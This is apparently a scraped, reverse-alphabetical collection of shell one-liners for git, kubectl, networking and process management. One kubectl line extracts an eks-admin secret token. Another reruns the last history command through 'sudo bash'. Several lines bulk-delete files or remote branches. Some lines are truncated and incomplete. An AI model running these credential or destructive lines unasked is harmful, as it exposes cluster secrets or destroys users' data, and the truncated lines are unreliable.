module load psi-python27/2.3.0 && source activate /das/work/p12/p12926/PythonEnv/xu27/ && cd /das/work/p12/p12926/codes_Hong/ && ls && pwd && gnome-terminal --window -e top --role=ROLE --title='xu_h1@ra-l-002 | WATCH TOP' --zoom=0.9 && gnome-terminal --window -e 'watch squeue' --role=ROLE --title='xu_h1@ra-l-002 | WATCH SQUEUE' --zoom=0.9 && gnome-terminal --window -e pwd --role=ROLE --title='xu_h1@ra-l-002 | WATCH DOCUMENTS' --zoom=0.9 && gnome-terminal --window -e '/das/work/p12/p12926/softwares/Fiji.app_40GB_20161214_1.51j/ImageJ-linux64' --role=ROLE --title='xu_h1@ra-l-002 | ImageJ' --zoom=0.9 && pwd
mask_path.rb | sort | uniq -c | sort -n | awk
map dirname | find . -iname $1 | tee ./$1_maps_found.log | pv | grep $1
man -k . | dmenu -l 30 | awk '{print \$1}' | xargs -r man -Tps | zathura -
make clean && make -j$(cat /proc/cpuinfo | grep processor | wc -l) && make -j$(cat /proc/cpuinfo | grep processor | wc -l)
lt| wc; find . -size -1k -name \*.jpg -type f | parallel -n 6 rm {} ; lt | tail -10 ; lt | wc
ls|sedesc|egrep '[.]zip$'|sed -e 's/^.*$/( mkdir & \&\& mv & & \&\& ( cd & \&\& unzip -q & ) \&\& rm &\/& )/' -e 's/[.]zip[ ][&]/\&/g' -e 's/[.]zip[/]/\//'|sh
ls|fzf --preview '[ -d {} ] && tree -C {}|head -200 || cat {}'
lsof |awk '{print $1}' |uniq -c | sort -rn |head
lsof | awk '{print \$1}' | sort | uniq -c | sort -n
lsof | awk '{ print \$1; }' | uniq -c | sort -rn | head
lsof | awk '{ print $1; }' | uniq -c | sort -rn | head
lsof -nPi tcp -F n | awk -F\> '/>/{print$2}'| sort | uniq -c | sort -nr
lsof -n |cut -d ' ' -f 1 | sort |uniq -c |sort -n
lsof -i tcp:1087 | grep ssh | awk '{print \$2}' | xargs kill; ssh -p 20002 -D 1087 -CfNg lhu@ec2-dca-a8k-p-bdpops-1.appannie.org; echo 'PWD' | pbcopy
lsof -i :9050 | grep tor | tr -s ' '' ' | cut -d ' ' -f2 | uniq
ls ~/wallpapers | sort -R | tail -n 1 | sed 's/^/wallpapers\//' | xargs feh --bg-fill
ls | sed 's/^.*\\.//' | sort | uniq -c | sort -n
ls | grep -v '\.\(pdf\|aux\|log\)$' | column
ls | egrep '.*\.(mp3|wav|mp4|aac)'
ls /Applications | sed -e 's/\.app$//g' | grep -E '^Xcode' | peco | xargs -I{} sudo xcode-select --switch /Applications/{}.app
ls -t ~/.empyrean/logs/aether*.dump | head -n1 | xargs cat | c++filt | less
ls -nlXa --group-directories-first | h 1- 2- 3- 4- 5- 6- 7- 8- 9- | h js json md html css rc | h -ni app bower element script gulpfile babel package | h -ni node module index
ls -ltr | tr -s ' ' | cut -d ' ' -f 9 | tail -n 1 | xargs less
ls -ltr | tr -s ' ' | cut -d ' ' -f 9 | tail -n 1 | xargs cat
ls -lhtr --time-style long-iso | tac | cat -n | tac | sed -s 's/^\s*\([0-9]*\)\s*\(.*\)/[\1] \2 [\1]/'g && pwd
ls -lR . | awk '{print \$1}' | sort -u | grep -v total | grep -v '^\\./'
ls -d */|sed 's|[/]||g'
ls -a |sed -e '/^.$/d' -e '/^..$/d' | xargs -i du -ms {}|sort -n |tee
ls -R | grep :*/ | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
ls *|rev|cut -d_ -f1 |rev|base64 -D
ls *.flv | xargs du -h | sort -n | cut -f 2 | xargs mp4ize
ls *.aar | rev | cut -c5- | rev | xargs -I {} $UNITY_BUILD_SCRIPTS_DIR/android/aar/extract_jar_from_aar.sh {}
lpass ls -l --sync=no --color=always | awk '{\$1=\$1;print}' | fzf --ansi | sed -r 's/.*\[id://g' | awk '{ gsub(\
links -dump randomfunfacts.com | sed -n '/^|/p' | tr -d \|
less `ls -rt | xargs file | grep -iv elf | tail -1 | cut -d: -f1`
lastlog | egrep '\[Nunca||Never\]' | gawk '{print \$1}'
lastb | awk '{print $3}' | sort | uniq -c | sort -n
kubectl get rs --output=json | jq -j '.items[].spec.selector | to_entries | .[] | \
kubectl get pods | grep customer | head -n1 | awk '{print $1}' | xargs -I{} kubectl port-forward {} 8000:8000
kubectl get po -o wide --all-namespaces | grep -v NODE | awk '{print $8}' | sort | uniq -c
kubectl get po -o wide --all-namespaces --field-selector=status.phase!=Succeeded | grep -vE '1/1|2/2|3/3|4/4'
kubectl get nodes --no-headers | awk '{print $1}' | xargs -I {} sh -c 'echo {}; kubectl describe node {} | grep Allocated -A 5 | grep -ve Event -ve Allocated -ve percent -ve -- ; echo'
kubectl get deployment -ojsonpath='{...image}' | tr '[[:space:]]' '\n' | sed -e s@(.*[^/])/@@g | tr ':' ' ' | column -t
kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true -l debug=true pods | fzf | tr -d '\n' | tee >(pbcopy) | NUL
kubectl exec -it \$(kubectl get po | grep --color=never janitor | grep --color=never Running | head -1 | awk '{print \$1}') -- python -i app/cli.py
kubectl exec -it \$(kubectl get po | grep --color=never app | grep --color=never Running | head -1 | awk '{print \$1}') -- python -i app/cli.py
kubectl describe service | grep Endpoint | grep -v none | awk '{ print $2 }'| xclip -selection c
kubectl config get-contexts | grep $(kubectl config current-context) | rev | cut -d ' ' -f 1 | rev
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep eks-admin | awk '{print $1}') | grep token: | awk '{ print \$2 }'
kubectl -n devops-ci get pods -o json | jq '.items[] | select(.status.reason!=null) | select(.status.reason | contains(
knife search node 'chef_environment:prod AND role:frontend' -i | grep -vE '(^$)|(found$)' | sed s/$/.s.lever.co/ | pssh -l enjalot -iP -t0 -h /dev/stdin sudo grep -irn '$1' /var/log/lever/upload.log
killall running.bin || true && wg-quick up azirevpn-uk1 || true && running.bin &> /dev/null&
killall running.bin || true && wg-quick down azirevpn-uk1 || true && running.bin &> /dev/null&
killall php && wait 2 && echo $(ps aux|grep php)||killall php-cgi && wait 2 && echo $(ps aux|grep php)
killall node || killall redis-server || killall mongod
kill \$(ps aux | grep node.*bot | grep -v grep | awk '{print \$2}') && ps aux | grep node
kill \$(ps aux | grep node.*api | grep -v grep | awk '{print \$2}') && ps aux | grep node
kill \$(ps aux | grep conta | grep flash | tr -s ' ' | cut -d ' ' -f '2')
kill \$((ps ax|grep node; ps ax|grep hapr) | grep -v grep | cut -f 1 -d s)
kill -USR1 `ps -ef | grep thttpd | grep -v grep | sed s/\\\s\\\+/=/g | cut -d= -f2`
kill -9 `ps | grep 'zeus' | grep -v 'grep' | awk '{print $1}' | xargs`; rm .zeus.sock
kill -9 `ps aux | grep sqldeveloper | grep classpath | cut --complement -c1-9 | cut -c1-5`
kill -9 $(ps aux | grep cassandra | grep java | awk '{ print $2 }'); sleep 1; ps aux | grep cassandra
kill -9 $(ps -u $(whoami) | grep python | sort | head -1 | awk
kill -9 $(lsof | grep TCP | grep [r]uby | awk '{print $2}' | uniq)
kill -2 \$(ps x | grep -v 'grep' | grep mongo | xargs | cut -d' ' -f1)
k get po | awk '/metoo/ || /celery/ {print $1}' | awk '/metoo/{++cnt} /celery/{++cel} {print} END{printf \
k get po --all-namespaces -o json | jq '.items[] | select(.status.reason!=null) | select(.status.reason | contains(\
k -n dev get po | grep $(git branch | grep \* | cut -d ' ' -f2 | tr / -)
jps | grep -v 'Jps\|RemoteMavenServer\|Launcher\|NailgunRunner'
jps | grep -v ' Jps$' | grep -v ' org.eclipse.equinox.' | cut -d ' ' -f 1 | xargs -r kill
jps | egrep 'intellij|jetbrains' | awk '{print \$1}' | xargs --no-run-if-empty --verbose kill -9
jps -lm | grep karaf | grep -v grep | awk '{print $1}' | xargs -n1 kill -s KILL
jls | awk '{print \$3}' | grep -v Address | cut -d. -f1 | xargs echo
j-bbc 2>&1 | tee clean.log && j-bb 2>&1 | tee build.log && j-bbt 2>&1 | tee test.log && j-bbr 2>&1 | tee release.log
ipcs -s ; ipcs -s | grep xyz | cut -d ' ' -f 2 | sed 's/^/-s /g' | xargs ipcrm; ipcs -s
ipcs -q | cut -d' ' -f2 | \grep ^[0-9] | sed -e 's/^/ -q /' | xargs ipcrm
ip address | grep -e 'inet\(.*\)\(enp0s25\|wlan0\)' | cut -d' ' -f6 | sed \
ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print \$2}' | cut -f1 -d'/'
ip addr show | grep -E 'inet[^6]' | grep global | sed -E -e 's/\s+/ /g' -e 's/^\s*//' | cut -d ' ' -f 2
ip a | grep inet | grep -ve fe80 -e '127\\.0\\.0\\.1/8' -e '::1/128' | sort -n | sed 's/^\\s*//'
ip a | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v '172.17.'
ip a | egrep -i 'inet | up | down | unknown'
ip -4 addr | grep -v valid_lft |awk '{print \$2}' | sed 'N;s/\n/ /' | column -t
ip -4 addr | grep -oP 'inet \K\w+.\w+.\w+.\w+.' | grep -v '127.0.0.1' | cowsay -f bud-frogs | lolcat
iotop -bo | grep -v DISK | awk '\$4 > 100 || \$6 > 100{print}\'
ioreg -l | grep -i capacity | tr '\n' ' | ' | awk '{printf(
invoker list | cut -d '|' -f 4 | awk 'NR>=4 && !/\+-/' | xargs -n 1 invoker reload
ifconfig|grep 'inet[^6]'|sed 's/^.*inet //g'|sed 's/ netmask.*//g'|sed '1d'
ifconfig |grep inet|awk '{print $2}'|head -4 | tail -1
ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active' | egrep -o -m 1 '^[^\t:]+' | xargs ipconfig getifaddr; curl ipecho.net/plain; echo
ifconfig | grep inet.addr | grep -v 127.0.0.1 | awk -F: '{print $2}' | awk '{print $1}'
ifconfig | grep inet | grep -v inet6 | grep -v 127.0.0.1 | awk '{print \$2}'
ifconfig | grep inet | grep -v inet6 | grep -v 127.0 | cut -d ' '' -f 2
ifconfig | grep inet | grep -v inet6 | grep -v 127 | awk '{print \$2}'
ifconfig | grep Bcast | tail -n1 | cut -d' ' -f14 | cut -d':' -f2
ifconfig | grep 192.168 || ifconfig | grep 10.32
ifconfig | grep -w inet | grep -v 127.0.0.1 | awk '{print $3}' | cut -d ':' -f 2
ifconfig | grep -w inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d ':' -f 2
ifconfig | grep -a1 eth0 | grep inet | cut -d ':' -f2 | cut -d ' ' -f1
ifconfig | grep -Eo 'inet (addr:|adr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1' | uniq
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v '172.17.0.1'
ifconfig | grep -Eo '([0-9]+\.){3}([0-9]+.)' | grep -Ev '255\$|(127.0.0.1)|(255.255.255.0)'
ifconfig | grep -A3 wlp3s0 | grep inet6 | sed -e 's/^[[:space:]]*//' | cut -d \
ifconfig | grep -A3 $(netstat -rn | grep UG | rev | cut -d
ifconfig | grep --color=none -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep --color=none -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1
ifconfig | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print \$1}'
ifconfig | grep 'inet addr:' | grep 'Bcast' | sed 's/:/ /g' | awk '{print $3}'
ifconfig | grep 'inet addr:' | awk {'print $2'} | grep -v '127.0.0.1' | sed -e 's/addr://'
ifconfig | grep 'inet ' | grep 192.* | cut -d ':' -f 2 | cut -d ' ' -f 1
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | tail -n 1 | sed 's/.*inet \([^ ]*\) .*/\1/'
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d\t -f2 | sed 's/[^0-9\.]*//g'
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d\ -f2 | tail -n1
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | sed s/addr://
ifconfig | grep 'inet ' | grep -v '127.0.0.1' | head -n1 | awk '{print $2}'
ifconfig | egrep 'addr:[0-9]+' | sed 's/^[ \t]*//' | cut -d' ' -f2 | sed 's/addr://'
ifconfig | egrep '133.|192.|134.|172.'
ifconfig tun0 | grep inet | head -1 | xargs | cut -d
ifconfig eth0 | \grep inet | grep -v inet6 | cut -d':' -f2 | cut -d' ' -f1
ifconfig en0 | grep ether | tail -n 1 | awk '{ print $2 }' | tail
ifconfig en0 | grep -E 'status|inet|inet6' | sort -br
ifconfig -a | grep inet | grep -v 127.0.0.1 | grep 192.168 | awk '{print \$2}'
ifconfig -a | grep -o 'inet \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | grep -v '127\.0\.0\.1' | sed -e 's/inet //'
if type nmcli &>/dev/null; then nmcli device wifi rescan; sleep 1s;nmcli -p device wifi list; else /sbin/iwlist scan 2>&1|/bin/egrep -v '(lo|eth0|sit0)'|/bin/grep -v '^\s*\$';fi
if [[ -f .git/MERGE_HEAD ]]; then git commit; fi 2> /dev/null || git rebase --continue 2> /dev/null || git cherry-pick --continue
if [ $(pgrep tmux | wc -l) -gt 1 ]; then tmux ls | awk {print$1} | cut -d: -f1 | xargs -I{} tmux kill-session -t {}; fi
iconv -t ascii//TRANSLIT | sed -E s/[^a-zA-Z0-9]+/-/g | sed -E s/^-+\|-+$//g | tr A-Z a-z
hub pr list | fzf | awk '{print \$1}' | tr -d '#' | xargs hub pr checkout
history|egrep '( m )|( m6 )'|grep -v grep|tail
history|cut -c 8-|sort|uniq|grep --color
history|awk '{print \$4}'|sort|uniq -c|sort -n
history |tail -n2 |head -n1 | cut -d ' ' -f4- | copy
history | tail -n 2 | head -n 1 | sed -r 's/^\s+[0-9]+\s+//g' | pbcopy
history | tail -n 2 | head -n 1 | cut --complement -c1-7 | cat >> ~/favcommands.fav
history | tail -n 2 | colrm 1 7 | head -n 1 | sudo bash
history | tail -n 1000 | ~/.dotfiles/bin/typealot-filter.rb | sort -rn | head -n 20
history | tail -2 | head -1 | cut -d' ' -f5- | xsel -b
history | sed 's/[[:digit:]]\+\** *//' | sort | tr -s ' ' | uniq
history | grep -w cd | grep -v history | cut -c 26- | sort -u
history | cut -c 8- | sort | uniq -c | sort -rn
history | cut -c 8- | sort | uniq -c | sort -n
history | awk '{print \$2}' | sort | uniq -c | sort
history | awk '{print $2}' | sort | uniq -c | sort
history 1 | awk '{print \$2}' | sort | uniq -c | sort -nr
history -n && history | sort -k2 -k1nr | uniq -f1 | sort -n | cut -c8- > ~/.tmp$$ && history -c && history -r ~/.tmp$$ && history -w && rm ~/.tmp$$
highlight --dark-red ^-.* | highlight --dark-green ^+.* | highlight --yellow ^Only.* | highlight --yellow ^Files.*differ$ | less -XFIRd
hg outgoing -v |grep files: |cut -c 14- |tr ' ' '\n' |sort -u
heroku apps --all | grep '(' | sed 's/ .*$//' | fzf --header='Select the app you want to tail the logs' | xargs heroku logs -t -a
heroku apps --all | grep '(' | sed 's/ .*$//' | fzf --header='Select the app you want to bash into' | xargs heroku run bash -a
header location | query_param SAMLRequest | urldecode | base64 -D | inflate
head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 32 | head -n 1 | copy
gvim -p `find . | grep 'py' | grep -v svn | grep -v pyc | grep -v init`
gtimeout 1 elinks -dump randomfunfacts.com | sed -n '/^| /p' | tr -d \|
gsutil ls -R gs://kubernetes-release/release/v1.3.5 | sed 's|gs://kubernetes-release|https://storage.googleapis.com/kubernetes-release|; /^.*:$/d; /^$/d'
gss | grep -E '^??' | tabify | cut -f2 | xargs open
gss | grep '^.M' | cut -c4- | cut -d' ' -f3 | xargs git add
gs | grep 'both modified' | awk '{print $4}' | head -n 1 | xargs subl
gs f3c8275 | grepc 'getfilter|diff \-\-' | h -ni '\.java|src/main/java/com/groupemre/atnv2/'
grep -viE 'Nmap done|Starting Nmap|Nmap scan report|Host is up' | sed '/^$/d;s/PORT/\nPORT/g'
grep -vE '(^[[:space:]]*($|(#|!|;|//)))'
grep -v -E ""^linux-|^tools|^cooked|^tests"" |
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'
grep -ir ./.*$ --only-matching --with-filename . | sed -E -e \'s/[;]//g; s/:/\t\t/g' | sort |column -t | tr -d'
grep -Pzo '# Summary(.|\n)*\n# Config' ~/.tmux.conf | head -n -2 | sed 's/^#//g' | sed 's/^ //g'
grep -Ev '^(#|;|$|(//)|(--))'
grep -Eo '^\w+\s*).*' runfile | sed 's/)[# ]*/|/' | column -s '|' -t
grep -Eao '((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
grep -E 'rb|rake|Gemfile|ru' | xargs rubocop -a
grep -E '^Set-Cookie: _(.*)=.*--.*$' | sed -E 's/^.*=(.*)--.*$/\1/' | urlencode -D | base64 -D | unmarshal
grep -E '\.(ir|mm|cu|sd|sy):' /etc/userdomains
grep --color=always -E '^|error|undefined|candidate' | less -R
grep '^function . .. ' ~/$CO_BA_FILE | awk '{print $2}' | cut -d'(' -f1 | sort | awk -v c=4 'BEGIN{print \
grep '^bind' ~/.config/i3/config | cut -d ' ' -f 2- | sed 's/ //' | column --table --separator  | fzf --preview-window=hidden
grep 'E(MP2)' | tr -s [:blank:] | cut -d ' ' -f 3 | nl | sort -nr -k 2
grep 'E(MP2)' | sed '/NaN/d' | tr -s [:blank:] | cut -d ' ' -f 3 | gnuplot -e \
gpg2 --list-secret-keys|grep \< --color=no | sed -e 's/^.* <//' -e 's/>$//'|head -n 1 | xsel -ib
gpg -k --keyid-format 0xlong | sed '/^[sp]ub\s/ {s|/| |1;}'
gls -lhtr --time-style long-iso | gtac | gcat -n | gtac | gsed -s 's/^\s*\([0-9]*\)\s*\(.*\)/[\1] \2 [\1]/'g && pwd
git-comp && git branch -a --merged | grep -v 'master' | grep remotes/origin | sed -e 's% *remotes/origin/%%' | xargs -I% git push origin :%
git symbolic-ref HEAD 2>/dev/null | sed 's|refs/heads/||'
git symbolic-ref -q HEAD | sed -e 's|^refs/heads/||'
git svn dcommit --dry-run | grep '^diff-tree' | cut -b 11- | git diff-tree --stdin -p -v | less
git status|grep -v pom.xml|grep -v scss|grep -v png|grep -v jpg
git status|grep 'deleted'|sed 's/.*deleted:[[:space:]]*\(.*\)/\1/'|sed 's/.meta$//'|xargs mkdir
git status | grep modified | lr 9 9 | c2 | xargs git diff --cached
git status | grep modified | lr 9 9 | c2 | xargs git diff
git status | grep modified | lr 9 9 | c2 | xargs git add
git status | grep modified | lr 8 8 | c2 | xargs git diff --cached
git status | grep modified | lr 8 8 | c2 | xargs git diff
git status | grep modified | lr 8 8 | c2 | xargs git add
git status | grep modified | lr 7 7 | c2 | xargs git diff --cached
git status | grep modified | lr 7 7 | c2 | xargs git diff
git status | grep modified | lr 7 7 | c2 | xargs git add
git status | grep modified | lr 6 6 | c2 | xargs git diff --cached
git status | grep modified | lr 6 6 | c2 | xargs git diff
git status | grep modified | lr 6 6 | c2 | xargs git add
git status | grep modified | lr 5 5 | c2 | xargs git diff --cached
git status | grep modified | lr 5 5 | c2 | xargs git diff
git status | grep modified | lr 5 5 | c2 | xargs git add
git status | grep modified | lr 4 4 | c2 | xargs git diff --cached
git status | grep modified | lr 4 4 | c2 | xargs git diff
git status | grep modified | lr 4 4 | c2 | xargs git add
git status | grep modified | lr 3 3 | c2 | xargs git diff --cached
git status | grep modified | lr 3 3 | c2 | xargs git diff
git status | grep modified | lr 3 3 | c2 | xargs git add
git status | grep modified | lr 2 2 | c2 | xargs git diff --cached
git status | grep modified | lr 2 2 | c2 | xargs git diff
git status | grep modified | lr 2 2 | c2 | xargs git add
git status | grep modified | lr 1 1 | c2 | xargs git diff --cached
git status | grep modified | lr 1 1 | c2 | xargs git diff
git status | grep modified | lr 1 1 | c2 | xargs git add
git status | grep modified | grep '.py' | awk '{print \$2}' | xargs -n1 pep8
git status | grep deleted: | cut -c 14- | sed -e 's/ /\\ /g' | xargs git rm
git status | grep -v ucd | grep -v uml | grep -v jpg | grep -v todo
git status | grep -v scripts/phpsh | grep -v 'gen-' | grep -v tags | grep -v 'conf/dev.php'
git status | egrep 'modified:' | awk -F : '{print $2}' | sed '/^$/d' | xargs git add
git status --short | grep -v -e '^\s*[DR]' | awk '{print \$2}' | grep -e 'rb$' | xargs rubocop
git status --porcelain | grep -E '^(M|A|R).*_spec.rb$' | sed -e 's/^.. //'
git status --porcelain | cut -c4- | grep -E '(\.rb)|(\.rake)' | xargs bundle exec rubocop
git status --porcelain spec/ | grep -v '^ D' |grep '_spec.rb'| sed 's/^...//' | xargs -o bundle exec rspec
git st | grep UU | cut -d' ' -f2 | head -1 | xargs git add
git st | grep UU | cut -d' ' -f2 | head -1 | xargs ec
git st | grep -P 'both (added|modified)' | sed -r 's/both .*:\s*(.*)$/\1/g' | xargs vi -p
git show | head -1 | cut -d' ' -f2 | cut -c1-7 | pbcopy
git reset HEAD~1 --soft || git reset || git stash
git remote update --prune && git gc --aggressive --prune=now && git branch --merged | grep -E -v 'master|rc|develop' | xargs -I{} git branch -d {}
git remote show origin -n|grep Fetch|sed 's/ Fetch URL: //'|sed 's/.git$//'|sed 's/git@github.com:/https:\/\/github.com\//'
git remote prune origin && git branch -r | awk '{print \$1}' | egrep -v -f /dev/fd/0 <(git branch -vv) | awk '{print \$1}' | xargs git branch -d
git remote prune origin && git branch --merged develop | grep -v develop | grep -v uat | grep -v master | xargs -n 1 git branch -d
git remote get-url origin | sed -E 's|\.git$|/pipelines|'
git remote add zzz `git remote -v|grep origin|grep fetch|sed s/GigaOM/zbtirrell/|awk
git remote add matt `git remote -v|grep origin|grep fetch|sed s/GigaOM/borkweb/|awk
git remote -v|cut -f1|sort|uniq|xargs -n 1 git fetch
git remote -v | sed '/heroku/d' | grep fetch | cut -f 1 | xargs -I {} git remote update {} --prune; git submodule update
git remote -v | grep -P \(push\) | cut -d ' ' -f 1 | cut -f 2 | xargs -r \$BROWSER
git remote -v | grep 'origin' | grep 'push' | awk '{print \$2;}' | xargs -I {} -p git remote add upstream {}
git remote -v | ag fetch | sed 's/(fetch)//g' | tr '\t' ' ' | column -t
git ran -e '^s|^a|^dic|^git|^ran'
git push || { git pull --rebase && { gcs || true; } && git push; }
git pull --prune && git branch -r | awk '{print \$1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print \$1}' > /tmp/merged-branches && vim /tmp/merged-branches && xargs git branch -d < /tmp/merged-branches
git pull && git fetch -p && git branch -vv | grep ': gone]'| grep -v '\*' | awk '{ print $1; }' | xargs git branch -d
git pr && git branch -vv | grep ' gone]' | cut -c3- | awk '{print \$1}' | xargs git branch -D
git merge master || printf '\nConflict files:\n' && git status | grep 'both modified:' | sed 's/^.*both modified: *//g'
git merge --continue||git rebase --continue||git cherry-pick --continue
git merge --abort||git rebase --abort||git cherry-pick --abort
git ls-files | grep '\.swp$' | xargs git rm && git ls-files | grep '\.~' | xargs git rm
git ls-files | egrep '.*\.(cpp|h|c)$' | xargs scripts/astyle.sh
git log | grep Author | sort | uniq -c | sort -rn
git log | grep '^Author' | sort | uniq -ci | sort -r
git log master..head --name-only | grep '^[a-z]' | grep -v '^commit' | sort | uniq
git log --use-mailmap | grep ^Author: | cut -f2- -d' ' | sort | uniq > AUTHORS
git log --pretty=oneline | head -n 1 | awk {'print $1'} | git show | grep diff
git log --pretty=format:'%s' | cut -d ' ' -f 1 | sort | uniq -c | sort -nr
git log --pretty=format: --name-only | sort | uniq -c | sort -rg | head -20
git log --pretty=format: --name-only | sort | uniq -c | sort -rg | head -10
git log --name-only --oneline | grep -v ' ' | sort | uniq -c | sort -r
git log --grep snemeth --grep Szilard --grep 'Szilard Nemeth' --oneline | grep 'YARN\|SUBMARINE\|HADOOP' | wc -l
git log --format=format: --name-only | grep -v '^$' | sort | uniq -c | sort -r
git log --abbrev-commit --date=relative --format=format:'%<(10)%h %<(20)%ar %<(75)%s %an %d' --all | fzf-tmux -d 15 | xargs echo | cut -f 1 -d ' ' | pbcopy
git for-each-ref --sort=-committerdate refs/heads/ --format='%(refname) %(committerdate) %(authorname)' | sed 's/refs\/heads\///g' | grep 'Jeff Wolski' | head -n 5 | cut -f 1 -d ' '
git for-each-ref --sort='-committerdate' --format='%(refname:short)|%(committerdate:relative)' refs/heads | sed -e 's-refs/heads/--' | column -s '|' -t
git for-each-ref --sort='*authordate' --format='%(*authorname) | %(taggerdate:iso8601) | %(tag) | %(contents)' refs/tags|grep -v ^$
git fetch; git branch --merged master | sed 's/ //g' | grep -v '*' | grep -v 'master$' | xargs git branch -d
git fetch -p && git branch --merged | grep -v '\*' | grep -v 'dev' | grep -v 'master' | xargs -n 1 git branch -d
git fetch --prune ; git branch --merged | grep -vE 'master|dev' | grep -v '^*' | xargs git branch -d
git fetch --prune && git branch -vv | grep 'gone]' | sed 's/\*//' | awk '{print \$1}' | xargs git branch -D
git fetch --prune && git branch -vv | grep ': gone]'| grep -v '\*' | awk '{ print $1; }' | xargs git branch -D
git fetch --prune && git branch --merged | grep -vE '^\*|master$|develop$' | xargs -I % git branch -d %
git fetch --prune && gb | grep ': gone' | tr -s ' ' | cut -d ' ' -f2 | xargs git branch -D
git fetch && git remote prune origin && git branch -r | sed 's/ *origin\///' | grep -v 'master$' | grep -v 'production$' | xargs -I% git push origin :%
git fetch && git remote prune origin && git branch -r --merged master | sed 's/ *origin\///' | grep -v 'master$' | grep -v 'production$' |xargs -I% git push origin :%
git dsf --cached HEAD^ | less -SRc --tabs=4 --pattern '^(Date|added|deleted|modified): '
git diff-tree --no-commit-id --name-only -r HEAD | grep subprojects | cut -d\/ -f 2 | sort -u | groovy -e \
git diff | grep + | wc && git diff | grep - | wc
git diff master --stat | grep -v '37\|config' | awk '{print $1}' | while read arq; do echo $arq foi lido; done
git diff master --name-only | egrep -v '^vendor|^__vendor|_tools' | xargs git diff master --shortstat --
git diff master --name-only | egrep -v '^vendor|^__vendor|_tools' | xargs git diff master --
git diff master --name-only | egrep '.py$' | xargs env/bin/pylint --output-format=parseable --rcfile=pylintrc | egrep -v '^tests.*: .*(Missing docstring|Invalid name \
git diff -M -C --cached --name-only | grep '_spec.rb' | xargs rspec || EXIT_STATUS=$?
git diff --name-only | xargs grep -il '<<<<<<' | grep -v filter|uniq | xargs subl
git diff --name-only | fzf --preview 'echo {} | xargs git diff --color=always | diff-so-fancy | less --tabs=4 -RFX'
git co master && git branch --merged | grep -v '\*\|master\|develop' | xargs -n 1 git branch -d
git checkout master | git branch -r --merged | grep -v master | sed -e 's/origin\//:/' | xargs git push origin
git checkout master && git remote update --prune | git branch -r --merged | grep -v master | sed -e 's/origin\//:/' | xargs git push origin
git checkout master && git branch --merged | grep -v \* | grep -v master | grep -v develop | xargs git branch -d && git remote prune origin
git checkout master && git branch --merged | egrep -v '(^\*|master|dev)' | xargs git branch -d
git checkout develop && git pull origin develop && git branch --merged | grep -Ev 'develop|core|\*' | xargs git branch -d && git remote prune origin
git checkout develop && git branch --merged | grep -v \* | grep -v master | grep -v develop | xargs git branch -d && git remote prune origin
git branch | remove-colors | cut -c3- | egrep -i '^s+a+v+.*' | xargs git branch -D
git branch | grep \* | cut -d ' ' -f2 | pbcopy . | xargs
git branch | grep \* | cut -c 3- | tr -d '\n' | pbcopy
git branch | grep -v ‘*\|master\|next’ | xargs git branch -D
git branch | grep -v release | grep -v \* | grep -v Dev_ | xargs git branch -D
git branch | grep -v 'master\|staging\|develop' | xargs git branch -D
git branch | grep -v 'master' | sed 's/^[ *]*//' | sed 's/^/git branch -d /' | bash
git branch | grep -v '^ master$' | grep -v 'release/v' | grep -v '^* ' | xargs git branch -D
git branch | grep -v '\*.*' | peco | awk '{print $1}' | xargs git checkout
git branch | grep '*' | sed s/\*\ // | tr -d '\n\r' | pbcopy
git branch 2> /dev/null | grep \* | awk '{ print \$2 }' | tr -d '\n' | sed 's/\([0-9a-zA-Z]\+\)/(\1)/g'
git branch -vv | grep origin | grep gone | awk '{print $1}' | xargs -L 1 git branch -D
git branch -vv | grep disparue | xargs -0 -L1 | grep -oP '^ [^ ]+' | xargs -I % sh -c 'git branch -D %'
git branch -vv | fzf +m | sed 's/\*//' | awk '{print \$1}' | xargs git checkout
git branch -vv | ag gone | tr -s ' ' | cut -d' ' -f2 | xargs -n 1 -p git branch -D
git branch -r | awk '{print \$1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print \$1}'
git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}'
git branch -r -vv | fzf +m | sed 's/origin\///' | awk '{print \$1}' | xargs git checkout
git branch -r --merged | grep zfa | sed '/>|master/d;/origin/!d;s:origin/::' | xargs --interactive git push origin --delete
git branch -r --merged | grep origin | grep -v '>' | grep -v master | sed 's/origin\///'
git branch -r --merged | grep -v origin/HEAD | grep -v origin/master | sed s#origin/## | xargs -n 1 git push origin --delete
